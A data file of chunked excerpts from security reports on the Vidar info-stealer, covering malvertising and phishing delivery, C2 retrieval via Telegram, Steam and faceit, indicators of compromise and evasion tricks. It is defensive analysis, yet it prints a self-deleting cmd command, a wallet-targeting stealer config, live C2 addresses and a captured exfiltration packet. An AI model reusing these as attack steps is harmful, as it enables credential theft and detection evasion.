FARPROC __stdcall vdr_retrieve_addr_of_kernel32_advapi32_API_funcs() { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-""+"" TO EXPAND] kernel32_dll_hdl = LoadLibraryA(str_kernel32_dll); g_kernel32_dll_hdl = kernel32_dll_hdl; if ( kernel32_dll_hdl ) { LoadLibraryA_1 = GetProcAddress(kernel32_dll_hdl, str_LoadLibraryA); GetProcAddress_0 = GetProcAddress(g_kernel32_dll_hdl, str_GetProcAddress); lstrcatA = GetProcAddress_0(g_kernel32_dll_hdl, str_lstrcatA); Sleep_1 = GetProcAddress_0(g_kernel32_dll_hdl, str_Sleep); GetSystemTime = GetProcAddress_0(g_kernel32_dll_hdl, str_GetSystemTime); ExitProcess_1 = GetProcAddress_0(g_kernel32_dll_hdl, str_ExitProcess); GetCurrentProcess_1 = GetProcAddress_0(g_kernel32_dll_hdl, str_GetCurrentProcess); VirtualAllocExNuma = GetProcAddress_0(g_kernel32_dll_hdl, str_VirtualAllocExNuma); VirtualAlloc = GetProcAddress_0(g_kernel32_dll_hdl, str_VirtualAlloc); VirtualFree = GetProcAddress_0(g_kernel32_dll_hdl, str_VirtualFree); *lstrcmpiW = GetProcAddress_0(g_kernel32_dll_hdl, str_lstrcmpiW); LocalAlloc_1 = GetProcAddress_0(g_kernel32_dll_hdl, str_LocalAlloc); GetComputerNameA = GetProcAddress_0(g_kernel32_dll_hdl, str_GetComputerNameA); } result = LoadLibraryA_1(str_advapi32_dll); g_advapi32_dll_hdl = result; if ( !result ) { return result; } result = GetProcAddress_0(result, str_GetUserNameA); GetUserNameA_1 = result; return result; }"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0a811138086c4e5c9209fba119ae8f4c
"Some of other VidarStealer codes here: https://github.com/m4now4r/VidarStealer/tree/main/some%20pseudo-code End! m4n0w4r

20/20"|data_input/vidar_reports/entry_25c8d5db-4c92-4d5f-8736-b053b4b89c1e.text|0e32fd18d2484ccdb33154655e624cf8
"Vidar Info-Stealer Malware Distributed via Malvertising on Google darktrace.com/blog/vidar-info-stealer-malware-distributed-via-malvertising-on-google

31 Jan 2023 31 Jan 2023 In recent weeks, security researchers and cyber security vendors have noted an increase in malvertising campaigns on Google, aimed at infiltrating info-stealer malware into the systems of unsuspecting victims, as reported in sources [1] [2]. It has been observed that when individuals search for popular tools such as Notepad++, Zoom, AnyDesk, Foxit, Photoshop, and others on Google, they may encounter ads that redirect them to malicious sites. This report aims to provide a high-level analysis of one such campaign, specifically focusing on the delivery of the Vidar Info-stealer malware. Campaign Details On the 25th of January 2023, Darktrace researchers observed that the advertisement depicted in Figure 1 was being displayed on Google when searching for the term ""Notepad++"" from within the United States.

Figure 1: Google Ad shown when searching for Notepad++ As can be seen in Figure 2, the advertisement in question had no visible information regarding its publisher.

1/11

Figure 2: Advertisement information Clicking on the advertisement would direct potential victims to the website notepadplusplus.site, which had been registered on the 4th of January and is hosted on IP address 37.140.192.11. Upon selecting the desired version of the software, a download button is presented to the visitor.

2/11"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|69b2460d5d4844f6a8fed19df22a9919
"2/11

Figure 3: Malicious site with fake Notepad++

Figure 4: Malicious site with fake Notepad++

3/11

When clicking on Download, regardless of the version selected, the traffic is then redirected to https://download-notepad-plus-plus.duckdns.org/, and a .zip file with name “npp.Installer.x64.zip” is downloaded.

Figure 5: Traffic redirection Upon extraction, the file ""npp.Installer.x64.exe"" has a file size of 684.1 megabytes. The significant size is attributed to the inclusion of an excessive number of null bytes, which serve to prevent the file from being scanned by some Antivirus and uploaded to malware analysis platforms such as VirusTotal, which has a file size limit of 650 megabytes.

4/11

Figure 6: npp.Installer.x64.zip Initially, padding was incorporated at the end of the executable, enabling individuals to remove it while maintaining a fully functional file. However, in the sample analysed in this report, padding was inserted into the binary's central region. This method renders the removal of padding more challenging, as simply deleting the zeroes would compromise the integrity of the file and impede its functionality during dynamic analysis.

Figure 7: Beginning of null bytes padding

5/11"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|d57b266e496d425daa93375f3901c143
"Figure 7: Beginning of null bytes padding

5/11

Figure 8: End of null bytes padding After execution, the malware promptly establishes a connection to a Telegram channel to acquire its command and control (C2) address, specifically http://95.217.16.127. If Telegram is not available, the malware will then attempt to connect to a profile on video game platform Steam, in which case the C2 address was http://157.90.148.112/ at the time of initial analysis and http://116.203.6.107 later. It then proceeds to check-in and obtain its configuration file and subsequently downloads get.zip, an archive containing several legitimate DLL libraries, which are utilized to extract information and saved passwords from various applications and browsers. Through traffic analysis, the method by which the malware obtains its Command and Control (C2) location, and analysis of the configuration obtained, it can be assessed with high confidence that the malware in question is the info-stealer known as Vidar. Vidar has been extensively covered by various cybersecurity organizations. Further information regarding this info-stealer and its origins can be found here[3].

6/11

Figure 9: Telegram traffic

Figure 10: Telegram channel containing the location of Vidar’s C2 address

7/11

Figure 11: Steam profile containing the location of Vidar’s C2 address

Figure 12: Vidar C2 traffic Figure 13: Vidar configuration obtained from the C2

Figure 14: Libraries downloaded by Vidar

Campaign ID 827

8/11"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|cf897a14200b47ef83f6c1444cbe9889
"Figure 12: Vidar C2 traffic Figure 13: Vidar configuration obtained from the C2

Figure 14: Libraries downloaded by Vidar

Campaign ID 827

8/11

The domain download-notepad-plus-plus.duckdns.org, from which the malware is distributed, resolves to the IP address 185.163.204.10. Using passive DNS, it has been determined that multiple domains also resolve to this IP address. This information suggests that the threat group responsible for this campaign is also utilizing advertising to target individuals searching for specific applications besides Notepad++, including: OBS Studio Davinci Resolve Sqlite Rufus Krita Furthermore, it has been observed that all the malware samples obtained in this investigation connect to the same Telegram channel, utilize the same two Command and Control IP addresses, and share the same campaign ID of ""827""."|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|d3bd3cbcc3284d76adc6d120fbca7e4b
"Conclusion The recent proliferation of malvertising campaigns, which are employed by cyber-criminals to distribute malware, has become a significant cause for concern. Unlike more traditional infection vectors, such as email, malvertising is harder to protect against. Furthermore, the use of padding techniques to inflate the size of malware payloads can make detection and analysis more challenging. To mitigate the risk of falling victim to such attacks, it is recommended to exercise caution when interacting with online advertisements. Specifically, it is advisable to avoid clicking on any advertisements while searching for free software on search engines and to instead download programs directly from official sources. This approach can reduce the likelihood of inadvertently downloading malware from untrusted sources. Another effective measure to counteract the threat of malicious ads is the utilization of adblocker software. The implementation of an ad-blocker can provide an additional layer of protection against malvertising campaigns and enhance overall cybersecurity.

Appendices

Indicators of Compromise

Filename

npp.Installer.x64.zip

SHA256 Hash

7DFD1D4FE925F802513FEA5556DE53706D9D8172BFA207D0F8AAB3CEF46424E8

Filename

npp.Installer.x64.exe

9/11

SHA256 Hash

368008b450397c837f0b9c260093935c5cef56646e16a375ba7c47fea5562bfd

Filename

rufus



3.21.zip

SHA256 Hash

75db4f8187abf49376a6ff3de0163b2d708d72948ea4b3d5645b86a0e41af084

Filename

rufus



3.21.exe"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|e58209e775fb46d98acef59515f8633b
"Filename

rufus



3.21.zip

SHA256 Hash

75db4f8187abf49376a6ff3de0163b2d708d72948ea4b3d5645b86a0e41af084

Filename

rufus



3.21.exe

SHA256 Hash

169603a5b5d23dc2f02dc0f88a73dcdd08a5c62d12203fb53a3f43998c04bb41

Filename

DaVinci_Resolve_18.1.2_Windows.zip

SHA256 Hash 73f00e3b3ab01f4d5de42790f9ab12474114abe10cd5104f623aef9029c15b1e

Filename

DaVinci_Resolve_18.1.2_Windows.exe

SHA256 Hash

169603a5b5d23dc2f02dc0f88a73dcdd08a5c62d12203fb53a3f43998c04bb41

Filename

krita



x64



5.1.5



setup.zip

SHA256 Hash

85eb4b0e3922312d88ca046d89909fba078943aea3b469d82655a253e0d3ac67

Filename

krita



x64



5.1.5



setup.exe

SHA256 Hash

169603a5b5d23dc2f02dc0f88a73dcdd08a5c62d12203fb53a3f43998c04bb41

URL

http://95.217.16.127/827

URL

http://95.217.16.127/get.zip

URL

http://95.217.16.127/

URL

http://157.90.148.112/827

URL

http://157.90.148.112/

URL

http://157.90.148.112/get.zip

URL

http://116.203.6.107/

Domain

notepadplusplus.site

10/11

Domain

download



notepad



plus



plus.duckdns.org

Domain

download



obsstudio.duckdns.org

Domain

dowbload



notepadd.duckdns.org

Domain

dowbload



notepad1.duckdns.org

Domain

download



davinci



resolve.duckdns.org

Domain

download



davinci.duckdns.org

Domain

download



sqlite.duckdns.org

Domain

download



davinci17.duckdns.org

Domain

download



rufus.duckdns.org

Domain

download



kritapaint.duckdns.org

IP Address

37.140.192.11

IP Address

185.163.204.10

IP Address

95.217.16.127"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|6553ec877ab34e75b67e810003b48d4b
"rufus.duckdns.org

Domain

download



kritapaint.duckdns.org

IP Address

37.140.192.11

IP Address

185.163.204.10

IP Address

95.217.16.127

IP Address

157.90.148.112

IP Address

116.203.6.107

URL

https://t.me/litlebey

URL

https://steamcommunity.com/profiles/76561199472399815

References

[1] https://www.bleepingcomputer.com/news/security/hackers



push



malware



via



googlesearch



ads



for



vlc



7



zip



ccleaner/

[2] https://www.bleepingcomputer.com/news/security/ransomware



access



brokers



usegoogle



ads



to



breach



your



network/

[3] https://www.team



cymru.com/post/darth



vidar



the



dark



side



of



evolving



threatinfrastructure

More in this series:

No items found.

11/11"|data_input/vidar_reports/entry_f7da1c39-5f93-4e5f-9661-f1d240dd4a17.text|e7bd6cc616ac478998928d64b6f0548f
"Deep Analysis of Vidar Stealer medium.com/s2wlab/deep-analysis-of-vidar-stealer-ebfc3b557aed S2W

May 23, 2022

S2W May 28, 2021 · 12 min read Author: hypen (Sojun Ryu) @ Talon

Monkey Thief

Executive Summary Vidar Stealer is a malware specialized in stealing information mainly distributed as spam mail or crack version commercial software and keygen program. When installed, data such as infected device information, account, and history recorded in the browser is collected and leaked to the C&C server. In particular, it is one of the Stealer logs widely traded in DDW, and logs of infected PCs worldwide are being sold.

1/24

Previously, Vidar Stealer communicated with the C&C server hard-coded inside the malware, but from February 3, 2021, the method was changed to dynamically read the C&C server from the regular site. Vidar stealer switches its target software frequently in order to steal credential information stored in various browsers and programs. Therefore, the C&C server is continuously changing, so an automated response is necessary. S2W LAB has been analyzing Vidar Stealer malware behaviors and tracking changes and preventing related damage by collecting logs that are traded through DDW.

The flow of Vidar Stealer behavior"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|851cd8addd314bfe8ffaecbdd6df24d6
"The flow of Vidar Stealer behavior

Related Articles The Routes of Infection Recently, Vidar Stealer is mainly disguised as a Windows activation software. Because the Windows product is expensive, many people download illegal activation software to use it for free. In addition to Windows, many cases are disguised as a cracked commercial software, keygen software, etc. Users may recognize the risk of the software as most vaccines be able to detect and alert users, but they tend to ignore and execute them by taking their own risk.

Windows 10 Pro x64 keygen, Ardamax Keylogger 5.2 Crack, SmartMovie v3.25 Keygen 2/24

Last year, Vidar Stealer was distributed in South Korea through spam emails impersonated by the Fair Trade Commission. The contents in the email lure victims to open the attached file disguised as an official request letter. If the victim executes the attached file disguised as a document file icon, the user will be infected by Vidar stealer.

3/24

Email disguised as the Fair Trade Commission As Vidar Stealer has not been distributed with high-level technologies or serious vulnerabilities so far, so if users do not use illegal programs or access suspicious sites with caution, they can sufficiently prevent infection."|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|f1709589f06d44c4a4a6ce7dd5350213
"Vidar Stealer Behavior Analysis 1. Loader Vidar Stealer is packed with an unknown loader to prevent analysis. This loader’s characteristic is that data, strings, binaries, and other data necessary for malicious behavior do not have regularity. Because of this feature, it is challenging to detect this loader completely with a static method using detection signatures and Yara rules. In addition, even if the loader is detected, there is a limit to accurately distinguishing what the actual internal malicious code is. Code that assigns execute permission (VirtualProtect)

Additional binary decoding routine

4/24

On March 31, 2021, a malware analyst on Twitter (@c3rb3ru5d3d53c) named this Loader “DerpLoader” and noted that Vidar Stealer, as well as other Stealer malware such as KPot Stealer and Racoon Stealer, use it. As a result of the analysis, it was confirmed that all three stealers’ loaders are the same loader. Stealers mainly use EXE distribution methods disguised as specific programs, so they are easily exposed to AV. It is assumed that various Stealers use this loader to maximize detection avoidance.

Vidar Stealer and DerpLoader mentioned on Twitter"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|72e936b71bfa4848862b5575864594f3
"Vidar Stealer and DerpLoader mentioned on Twitter

2. Vidar Stealer Decode strings When Vidar Stealer is executed by the loader, the encoded string is firstly decoded and the string required for malicious behavior is extracted. As a decoding method, RC4 and Base64 are used in combination. For the RC4 Key, a string composed of 18 numbers is used, and each sample uses a different key.

Encoded strings in Vidar Stealer

5/24

Decoding strings using CyberChef

Dynamic collection of C&C servers In the former Vidar Stealer malware, the C&C server address was hard-coded. However, starting on February 3 this year, a method of dynamically collecting C&C servers has started using API functions provided by “faceit.com”, a Russian game-related community. The advantage of this method is that the faceit.com site cannot be blocked because it is a normal site. According to the former method, if the C&C server used by the malware is taken down, the malware becomes useless. However, in the case of dynamic collection, the C&C of the malware can be automatically updated by changing the content of “faceit.com” without modifying the malware every time. https://api.faceit[. ]com/core/v1/nicknames/[Attacker's nickname]

C&C server is included in the ‘about’ field of JSON format data

Normal DLL file download After that, Vidar Stealer downloads the normal DLL file required for malicious activity. Normal DLL File PathC:\ProgramData\

Normal DLL files related to Firefox 6/24"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|be5f5f1c83b243cea4eba7ed9a8a2b7b
"Normal DLL files related to Firefox 6/24

1. freebl3.dll 2. mozglue.dll 3. msvcp140.dll 4. nss3.dll 5. softokn3.dll Normal DLL files related to C/C++ 1. vcruntime140.dll 2. msvcp140.dll

Request configuration data After downloading the DLL file, the malware requests a specific page containing the configuration values. On this page, option values for which data to collect from the infected device are specified. Each option value is divided by ‘,’ and consists of a total of 12 values. Among these, some option values are not actually used. In addition, passwords.txt, information.txt, outlook.txt, files\Soft are unconditionally collected regardless of the options. 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*. *:*

Option 1, 5, 6, 10, 11 : Not used Option 2: Option to steal Browser’s Autofill, Cookies, Credit Cards data Option 3: Option to steal Browser’s History, Downloads Option 4: Option to steal Wallet data Option 7: Option to steal Telegram data Option 8: Option to get the Screen capture Option 9: Option to steal Certain files When the 9th option is activated, all files with a specific file name are collected using the last string separated by ‘;’. The format is as follows, and the collected files are saved in files\Files\[Work Folder]. [Save Folder];[Target Path];[Target file name list];[Maximum file size];[Seperator]"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|b70d6ebe208144cd9c8aae4d89b13fb2
"Data Theft The target software list is as follows. The target browser may be different for each malware because the attacker can customize the target browser list. As the version of Vidar Stealer goes up, the collection range is getting wider, and as of March 21, the highest version identified is 38. All stolen information is collected in the path below. C:\ProgramData\[A-Z0–9]{25}\files\

7/24

Compress the collected folder After collecting all the data, compress the “\files” folder into a ZIP file. The path of the created ZIP file is as follows, and different file names are used for each version. C:\ProgramData\[A-Z0–9]{25}\[MachineGUID][0–9]{10}.zip

Send data Afterward, it transmits a ZIP file containing the stolen data along with the infected device ID, information, and the version of Vidar to the C&C server.

Download additional payload If the attacker sets additional functions, there is the function to download and execute additional malware after leaking information to the C&C server. After requesting HTTP_QUERY_REFRESH, if the result contains the string “http”, it accesses the given URL to read additional configuration data. After this process, finally, it extracts the URL and downloads the malicious payload.

8/24

C&C Server → Download configuration data → Get download URL → Download another malwareC:\ProgramData\[A-Z0–9]{16}.exe “:Zone.Identifier”"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|063ba37036c04a3fa7c5c09e28a54ae9
"8/24

C&C Server → Download configuration data → Get download URL → Download another malwareC:\ProgramData\[A-Z0–9]{16}.exe “:Zone.Identifier”

Self-deleting After performing all malicious actions, Vidar Stealer deletes its own traces with the command below. “C:\Windows\System32\cmd.exe” /c taskkill /im [Filename] /f & erase [File path] & exit

Analysis of the domain used in the attack S2W LAB has been continuously monitoring and tracking Vidar Stealer’s C&C server construction method for three months since February 2021.

1. api.faceit.com The attacker first joined a game-related community in Russia called “faceit.com”. After that, the attacker has been updating the C&C server by using the Profile section of the user information page, and the malware requests this information through the API.

C&C server stored in the user information page The attacker has changed the community nickname for about three months and the C&C server collection URL. There are a total of 6 nicknames identified so far, and the created time and collected C&C servers are summarized below. When the nickname is replaced, the C&C server is not updated from the existing nickname, and the existing C&C servers are no longer used.

9/24"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|1bfc1b0c0a6c42c78ec0af886aceb7e1
"9/24

List of “faceit.com” addresses used to collect C&C servers, Created time: 2021–02–03 15:39:24 (UTC), Created time: 2021–02–19 13:13:17 (UTC), Created time: 2021–03–01 19:34:49 (UTC), Created time: 2021–03–11 20:36:28 (UTC), Created time: 2021–03–15 17:23:12 (UTC), Created time: 2021–03–18 11:07:19 (UTC), Created time: 2021–03–30 20:46:17 (UTC), Created time: 2021–04–26 15:50:43 (UTC), Created time: 2021–05–04 08:40:44 (UTC), Created time: 2021–05–17 23:39:57 (UTC), Created time: 2021–05–24 17:09:30 (UTC)

2. C&C server The attacker used many domains and IPs because the C&C server was changed in one day or every 3 to 4 days. We arranged the C&C server domains that we collected over three months, and we were able to confirm some characteristics. Most domains registered through NameSilo

Numerous C&C servers registered through NameSilo E-mail that the attacker used to register the domain. In particular, “xeronxik123” is strongly suspected as the ID was also used as the faceit.com nickname.1) 2)

Initially, the attacker registered and used the domain, but after that, it seems that the normal domain was compromised and used as a C&C server. Recently, Vidar communicates with IP type C&C server, and sometimes it is reused when the nickname is changed. The latest version of C&C Server list is continuously updated on the

10/24

11/24

3. Admin site Vidar Stealer can manage infected devices and control overall statistics through the admin site “my-vidar.com”.

12/24

my"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|84ff64ac8f234a7d8f59e5d4b3909299
"11/24

3. Admin site Vidar Stealer can manage infected devices and control overall statistics through the admin site “my-vidar.com”.

12/24

my



vidar.com/auth/login

Vidar Stealer in DDW 1. Vidar Stealer rental post Vidar Stealer is a MaaS-type malware sold on dark web forums. As shown in the post below, sales are being made, and they are actively trading from at least November 2018 to the present. Attackers collect information by targeting specific users with the rented malware or sell logs collected to an unspecified number of users again on DDW. • Prices 7 days → $130 14 days → $200 30 days → $300 60 days → $580 90 days → $750

13/24

Vidar Stealer sales post on the dark web

14/24

2. Vidar Stealer Log Sales Post Posts that sell logs collected by Vidar Stealer to DDW are also being found steadily. Mostly, rather than logs for a single target, many logs containing various countries are sold. It is often found that such postings also include Korea.

15/24

Vidar Stealer Log Sales in Deep Web Forum Since the collected log files are divided into KR as below, it is easy to identify that they are Korean victims, and password information and infected device information are stored inside the file.

16/24

Vidar Stealer log files

Korean site cookie information in the log file"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|043a2b5d83d54dfab6fadcb787aef801
"16/24

Vidar Stealer log files

Korean site cookie information in the log file

Conclusion The latest version of all Vidar Stealer malicious code C&C servers are constantly being changed through a dynamic acquisition method, but only one C&C server is active at the time of execution. Therefore, if a new C&C server can be collected by monitoring the C&C server collection URL, information leakage can be prevented even if it is infected with a malicious code, and measures can be taken by detecting infected devices attempting to connect. S2W LAB is monitoring the continuously updated Vidar Stealer C&C server collection URL, and through this, the C&C server is also being collected. In addition, we continue to analyze and track changes in Vidar Stealer’s C&C connection method. In the past, Stealer malware caused direct damage to individuals rather than companies, but with the recent increase in telecommuting due to the coronavirus, Stealer malware likely to steal accounts that can access corporate business networks. Since account stealing is 17/24"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|fe4597560c454ffa9cecf8dd66efd50e
"attempted not only for web browsers but also for various software, if important accounts are stolen, it is possible to infiltrate the corporate network. So, if these logs are sold to ransomware attack groups, the damage is out of control. In order to prevent Vidar Stealer infection, users should be cautious of executing programs from unknown sources, executing cracked or illegal activation programs, and opening spam emails. We also provide futher information regarding various Stealers via Xarvis Enterprise. Please refer to below pictures captured from Xarvis Enterprise.

Relation Graph of Vidar Stealer on Xarvis Enterprise

18/24

Credential Leak Monitoring Dashboard inside Xarvis Enterprise

Appendix Appendix 1: Example of the leaked file Filename: information.txt

19/24

Version: 37.5

Date: Fri Feb 12 08:24:56 2021 MachineID: eeeb5d54-7880-42a7-b542-739bbc26cf4b GUID: {846ee340-7039-11de-9d20-806e6f6e6963} HWID: eeeb5d54-7880-42a7-b542-9d20-806e6f6e6963

Path: C:\Users\admin\AppData\Roaming\build.exe

Work Dir: C:\\ProgramData\\A2KA889SJFAXH2KBIL2MLRZVK

Windows: Windows 7 Professional [x64] Computer Name: USER-PC User Name: admin Display Resolution: 1280x720 Display Language: en-US Keyboard Languages: English (United States) Local Time: 12/2/2021 8:24:56 TimeZone: UTC-0

[Hardware] Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz CPU Count: 4 RAM: 4095 MB VideoCard: Standard VGA Graphics Adapter

[Processes]

---------



System [4]

-----------------------------"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|d838ba24657c46f59626861fb5a20e4c
"[Processes]

---------



System [4]

-----------------------------



csrss.exe [352]



wininit.exe [400]



csrss.exe [412]



winlogon.exe [456]



services.exe [496]



lsass.exe [504]



lsm.exe [512]



svchost.exe [616]



IMEDICTUPDATE.EXE [1224]



srvpost.exe [1356]



SearchIndexer.exe [1412]



taskhost.exe [1796]

….

smss.exe [272]

[Software] Adobe Flash Player 27 ActiveX [27.0.0.187] Adobe Flash Player 27 NPAPI [27.0.0.187] Adobe Flash Player 27 PPAPI [27.0.0.187] Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.30501 [12.0.30501.0] Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.21.27702 [14.21.27702] Microsoft Visual C++ 2019 X86 Additional Runtime - 14.21.27702 [14.21.27702] Skype 7.39 [7.39.102] Microsoft Visual C++ 201520/24

2019 Redistributable (x86) - 14.21.27702 [14.21.27702.2] -2019 Redistributable (x64) - 14.21.27702 [14.21.27702.2] Realtek AC'97 Audio

Appendix 2: Communication api.faceit.com connection packet (HTTPS connection)

JSON data received from C&C

21/24"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|a8ca9d3c45f147b2adc32580e659f17e
"Appendix 2: Communication api.faceit.com connection packet (HTTPS connection)

JSON data received from C&C

21/24

{ ""result"": ""ok"", ""payload"": { ""country"": ""ca"", ""registration_status"": ""active"", ""about"": ""|"", ""matches_left"": 0, ""private_tournaments_invitations"": {}, ""user_type"": ""user"", ""games"": {}, ""matches_not_played"": 0, ""settings"": { ""language"": ""en"" }, ""active_team_id"": null, ""newsletter_promotions"": false, ""version"": 4, ""created_by"": ""anonymous"", ""favorite_tournaments"": [], ""activated_at"": ""Wed Feb 03 15:39:24 UTC 2021"", ""invitations_remaining"": 10, ""steam_id"": """", ""ongoing_rooms"": {}, ""updated_by"": ""5ee7a37c-54b8-4dac-a211-0329602f9398"", ""guid"": ""5ee7a37c-54b8-4dac-a211-0329602f9398"", ""private_tournaments"": [], ""status"": ""AVAILABLE"", ""guest_info"": {}, ""notification_tournament_joined_starts"": false, ""friends_ids"": [], ""flag"": """", ""created_at"": """", ""membership"": { ""type"": ""free"" }, ""memberships"": [ ""free"" ], ""newsletter_general"": false, ""nickname"": """", ""ongoing_tournaments"": {}, ""socials"": {}, ""website"": """", ""verified"": false, ""entity_type"": ""user"" }, ""server_epoch_time"": 1613118241, ""message"": ""Operation performed correctly. "", ""env"": ""prod"", ""you_are"": { ""roles"": [ ""anonymous"" ], ""user"": ""anonymous"" }, ""version"": ""2.174.3"" }"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|1781862c5dc742798a5680d177a9ed28
"Configuration data for stealing information 1,1,1,1,1,1,1,0,1,1,250,Desktop;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*. *:* Desktop\;*.*;4000;true;movies:music:mp3;Atomic;%APPDATA%\Atomic\;*. *;4000;true;movies: *.*:*ledger*.*:*trezor*.*:*wazirx*.*:*mew*.*:*bithimb*.*:*hitbtc*.*:*bitflyer*. *:*kuco

Captured Packet to breach victim’s data

22/24

POST / HTTP/1.1 Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1 Accept-Language: ru-RU,ru;q=0.9,en;q=0.8 Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1 Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0 Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A Content-Length: 8698 Host: duckclack.com Connection: Keep-Alive Cache-Control: no-cache





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""hwid""

eeeb5d54



7880



42a7



b542



9d20



806e6f6e6963





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""os""

Windows 7 Professional





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""platform""

x64





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""profile""

399





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""user""

admin





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""cccount""

0





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""fcount""

23/24

2





1BEF0A57BE110FD467A

Content"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|7f55a94c562f447ca13484ca7c4d7ea0
"data; name=""cccount""

0





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""fcount""

23/24

2





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""telegram""

0





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""ver""

37.5





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""ccount""

0





1BEF0A57BE110FD467A

Content



Disposition: form



data; name=""logs""; filename=""eeeb5d54



7880



42a7



b542739bbc26cf4b8568363090.zip""

Content



Type: zip

PK ... PK -



1BEF0A57BE110FD467A--

Appendix 3: MITRE ATT&CK

24/24"|data_input/vidar_reports/entry_ef2b8cbb-a73c-46c6-9c6e-9a2ef0f6f67f.text|9247a5e2f0ff4eefac73af9926e907da
"Vidar Stealer Evasion Arsenal

blog.minerva



labs.com/vidar



stealer



evasion



arsenal

1/3

Tweet

Vidar Stealer is not new to our world. It is known for stealing sensitive information such as banking details, IP addresses, saved passwords, browser history, login credentials, and recently, known crypto wallets. Being MAAS (Malware As A Service) gives it the ability to constantly develop. We spotted one of the new Variant’s hashes on RedBeard's twitter page. Following our research on the sample we have got, there is probably a code error. However, we have been able to detect several evasion techniques. There were two technique categories; anti-debugging and anti–emulation. Anti-debugging techniques are usually used to evade analysis of the file and make the analysis process more difficult. In most cases, anti-debugging techniques will not prevent an analysis but might slow it down significantly. The anti-debugging techniques used in our sample are: 1. The use of IsDebuggerPresent API call – read more here . 2. IsDebbugerPresent re-check inside a code by moving a ""large fs:30"" (a PEB block) to EAX register and checking a second byte. 3. The sample is packed – which is also a well-known anti-debugging technique.

2/3"|data_input/vidar_reports/entry_7b554533-d755-40b1-a0ff-42b0548e6908.text|c2df150e895e44e6b88f09663ad45350
"2/3

Anti–emulation techniques are also used to prevent analysis, but an analysis by security products. Security products might be sandboxes or anti-virus emulators. In code emulation, the emulator scans files' behavior, by executing the file in a virtual environment. The emulator is similar to sandboxes, but it is not a full-featured sandbox. Our sample uses two anti-emulation techniques: 1. Check if the username is ""JohnDoe"" - a user name associated with Windows Defender Emulator.

1. Check if the computer name “HAL9TH” - a computer name associated with Windows Defender Emulator.

Threat Actors are always finding a way of evading detection which is why it's crucial for you to have an anti-evasion product protecting your environment. Minerva is a pioneer and a world leader in preventing evasive malware. To learn more about how we can help protect your business from malware, click below.

Resources:

https://www.internetsecurity.tips/the



vidar



stealer



trojan



prevention



and



protection



tips/

https://www.kaspersky.com/enterprise



security/wiki



section/products/emulator

3/3"|data_input/vidar_reports/entry_7b554533-d755-40b1-a0ff-42b0548e6908.text|e0f05d46957248dbae52785a91f0d446
"Vidar Stealer H&M Campaign

0xtoxin



labs.gitbook.io/malware



analysis/malware



analysis/vidar



stealer



h



and



m



campaign

In this blog I'll be covering a recent phishing campaign that was targeting content creators while impersonating to a brand offering a collaboration offer to those creators.

The Phish The email that the user receives includes a short explanation that the company wants to be his partner, they explain to him when and for how long to put the promo video and of course how much money he will receive as a payment. At the bottom of the email the user will find a link to the promotion materials and his personal password:

1/30

Phishing Mail The promotion materials link leads to Google Drive, there the User will need to download an archive with the name of: H&M Corporation Advertising Contract.zip The archive contains inside of it several decoy files that are associated with H&M, and a 600MB .scr file with the name: H&M Advertising contract and Payment information.pdf.scr

Archive Content

.NET Loader Opening the loader in DiE,we can see that the loader is 32bit .NET assembly protected with Smart Assembly:

2/30

